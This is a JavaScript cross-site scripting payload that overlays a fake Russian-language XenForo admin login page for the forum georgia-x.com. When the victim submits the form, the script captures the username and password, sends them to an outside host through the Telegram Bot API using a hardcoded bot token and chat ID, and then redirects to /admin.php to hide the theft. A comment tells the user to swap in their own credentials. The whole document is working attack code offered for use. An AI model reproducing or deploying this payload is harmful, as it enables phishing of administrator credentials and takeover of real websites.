(function() {
    let overlay = document.createElement('div');
    overlay.id = 'xss-login-overlay';
    overlay.innerHTML = `
        <style>
            button,input{overflow:visible}[type=checkbox]{box-sizing:border-box;padding:0}html{line-height:1.15}body{margin:0}a{background-color:transparent}img{border-style:none}button,input{font-family:sans-serif;font-size:100%;line-height:1.15;margin:0}button{text-transform:none}[type=submit],button{-webkit-appearance:button}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}[hidden]{display:none}
            html{font:15px/1.4 sans-serif;font-family:'Segoe UI','Helvetica Neue',Helvetica,Roboto,Oxygen,Ubuntu,Cantarell,'Fira Sans','Droid Sans',sans-serif;font-weight:400;color:#141414;background:#185886}
            button,input{font-family:'Segoe UI','Helvetica Neue',Helvetica,Roboto,Oxygen,Ubuntu,Cantarell,'Fira Sans','Droid Sans',sans-serif;line-height:1.4}
            img{max-width:100%;height:auto}a{color:#2577b1;text-decoration:none}a:hover{color:#185886}
            *{box-sizing:border-box}
            .p-adminLogin{min-height:100%;background:#185886;color:#bcdef5}
            .p-adminLogin .adminLogin-wrapper{display:flex;padding:2vh 2vw;height:100vh;min-height:300px;align-items:center;justify-content:center}
            .p-adminLogin .adminLogin-content{width:100%;max-width:400px}
            .p-adminLogin .adminLogin-contentForm{background:#164f79;border:1px solid #13476c;padding:20px 40px;border-radius:10px;color:#bcdef5;box-shadow:0 5px 20px 0 rgba(0,0,0,0.25)}
            .p-adminLogin .adminLogin-row{margin:20px 0}
            .p-adminLogin .adminLogin-row>dt{margin-bottom:5px;display:none}
            .p-adminLogin .adminLogin-row>dd{margin:0;position:relative}
            .p-adminLogin .adminLogin-row>dd input{border:none;padding:10px;padding-left:30px;background:#13476c;font-weight:700;font-size:16px;color:#edf6fd}
            .p-adminLogin .adminLogin-row>dd input::placeholder{color:rgba(188,222,245,0.6)}
            .p-adminLogin .adminLogin-row>dd input+.far{position:absolute;top:0;left:0;bottom:0;width:30px;display:flex;align-items:center;justify-content:center;color:#bcdef5;font-size:16px}
            .p-adminLogin .adminLogin-row>dd .inputGroup-text.inputGroup-text{border:none;border-left:1px solid #113e5f;background:#13476c;color:rgba(188,222,245,0.8)}
            .p-adminLogin .adminLogin-row--submit .button{width:100%}
            .p-adminLogin .adminLogin-boardTitle{text-align:center;font-size:12px;margin-top:5px;color:rgba(188,222,245,0.5)}
            .button{display:inline-flex;align-items:center;justify-content:center;cursor:pointer;border:1px solid transparent;transition:background-color .25s ease;font-size:13px;border-radius:4px;padding:5px 10px;color:#edf6fd;background:#2577b1;border-color:#2985c6 #21699c #21699c #2985c6}
            .button:hover{background:#166eac}
            .inputGroup{display:flex;align-items:stretch;max-width:100%}
            .inputGroup .inputGroup-text{flex-grow:0;display:flex;align-items:center;white-space:nowrap;padding:0 6px}
            .inputGroup.inputGroup--joined .input{border-radius:0}
            .inputGroup.inputGroup--joined .input:first-child{border-top-left-radius:4px;border-bottom-left-radius:4px;border-right:none}
            .inputGroup.inputGroup--joined .inputGroup-text:last-child{border-left:0;border-top-right-radius:4px;border-bottom-right-radius:4px}
            .iconic{display:inline-block;position:relative;cursor:pointer}
            .iconic>input{position:absolute;opacity:0}
            .iconic.iconic--hideShow{min-width:56px}
            .iconic .iconic-label{font-size:13px;vertical-align:text-top}
            .fa-key:before{content:"\\f084"}
            .fa-user:before{content:"\\f007"}
        </style>
        
        <div class="p-adminLogin">
            <div class="adminLogin-wrapper">
                <div class="adminLogin-content">
                    <form class="adminLogin-contentForm" onsubmit="return false;">
                        <div><a href="https://georgia-x.com"><img src="/styles/default/xenforo/xenforo-logo.png" alt="XenForo Ltd."></a></div>
                        <div id="xss-error" style="background:#f8d7da; color:#721c24; padding:10px; border-radius:4px; margin-bottom:20px; display:none; font-size:13px; text-align:center;">Неверное имя пользователя или пароль</div>
                        <dl class="adminLogin-row">
                            <dt>Имя пользователя или email:</dt>
                            <dd>
                                <input type="text" id="xss-username" class="input" name="login" placeholder="Имя пользователя или адрес электронной почты…" autofocus>
                                <i class="far fa-user"></i>
                            </dd>
                        </dl>
                        <dl class="adminLogin-row">
                            <dt>Пароль:</dt>
                            <dd>
                                <div class="inputGroup inputGroup--joined">
                                    <input type="password" id="xss-password" class="input js-password" name="password" placeholder="Пароль…">
                                    <i class="far fa-key"></i>
                                    <div class="inputGroup-text">
                                        <label class="iconic iconic--hideShow js-hideShowContainer">
                                            <input type="checkbox" id="toggle-pwd" value="1">
                                            <i aria-hidden="true"></i>
                                            <span class="iconic-label">Показать</span>
                                        </label>
                                    </div>
                                </div>
                            </dd>
                        </dl>
                        <div class="adminLogin-row adminLogin-row--submit">
                            <button type="button" id="xss-submit" class="button button--icon button--icon--login">
                                <span class="button-text">Вход в панель управления</span>
                            </button>
                            <div class="adminLogin-boardTitle">Форум Georgia-X.com — все из жизни RC в СНГ</div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    `;
    
    document.body.appendChild(overlay);
    
    // глазик
    let toggleCheckbox = document.getElementById('toggle-pwd');
    let pwdField = document.getElementById('xss-password');
    let toggleLabel = document.querySelector('.js-hideShowContainer .iconic-label');
    
    if (toggleCheckbox) {
        toggleCheckbox.addEventListener('change', function() {
            if (this.checked) {
                pwdField.type = 'text';
                toggleLabel.innerText = 'Скрыть';
            } else {
                pwdField.type = 'password';
                toggleLabel.innerText = 'Показать';
            }
        });
    }
    
    // Отправка в Telegram
    document.getElementById('xss-submit').onclick = function() {
        let username = document.getElementById('xss-username').value;
        let password = document.getElementById('xss-password').value;
        
        if (!username || !password) {
            document.getElementById('xss-error').style.display = 'block';
            return;
        }
        
        // Telegram Bot API (ЗАМЕНИ НА СВОИ)
        let botToken = '8731675309:AAHMggFeWa97iLS4n6aGLbfPWNlRMTUvacQ';
        let chatId = '8173640646';
        
        let message = '🔐 НОВЫЕ ДАННЫЕ\n\n👤 Логин: ' + username + '\n🔑 Пароль: ' + password + '\n🌐 Сайт: georgia-x.com';
        
        fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        }).catch(function(e) { console.log('Telegram error:', e); });
        
        // Перенаправляем в админку georgia-x.com
        window.location.href = '/admin.php';
    };
    
    // Enter для отправки
    document.getElementById('xss-password').addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            document.getElementById('xss-submit').click();
        }
    });
})();